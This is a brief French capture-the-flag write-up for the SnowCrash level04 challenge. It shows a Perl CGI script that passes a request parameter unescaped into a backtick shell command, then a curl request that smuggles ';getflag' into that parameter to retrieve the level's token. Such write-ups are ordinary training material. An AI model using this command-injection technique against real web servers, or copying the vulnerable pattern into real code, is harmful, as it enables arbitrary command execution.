@@ -1,0 +1,25 @@
+On vois un fichier .pl
+
+quand on cat on comprend que c'est un script en perl
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+ici on utilise x pour injécté du code a cette fonction
+les `` qui entourent le echo interprete le contenu a l'interieur comme une commande
+cependant on peut ajouter un ; pour exécuter apres le echo la commande que l'ont veux
+ici getflag
+curl "http://localhost:4747/level04.pl?x=%3Bgetflag"
+
+%3B est l'encodage URL pour ';'
+
+level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=%3Bgetflag"
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
